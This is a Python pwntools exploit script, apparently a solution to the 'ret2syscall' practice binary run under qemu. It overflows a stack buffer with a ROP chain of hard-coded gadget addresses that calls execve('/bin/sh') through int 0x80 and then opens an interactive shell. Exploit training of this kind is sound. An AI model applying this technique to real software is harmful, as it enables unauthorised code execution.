from pwn import*
context(os='linux', arch='i386', log_level='debug')
sh=process(["qemu-i386","-L","/usr/i686-linux-gnu/","./ret2syscall"])
pop_eax_ret=0x080bb196
pop_ebx_ret=0x0806eb90  #pop_edx  pop_ecx pop_ebx ret
binsh=0x080be408
int0x80=0x08049421  #系统调用入口
bufaddr=0xffffdf0c
esp=0xffffdf7c
offset=esp-bufaddr
payload=flat(offset*b'A',p32(pop_eax_ret),0xb,p32(pop_ebx_ret),0,0,binsh,p32(int0x80))
sh.sendline(payload)
sh.interactive()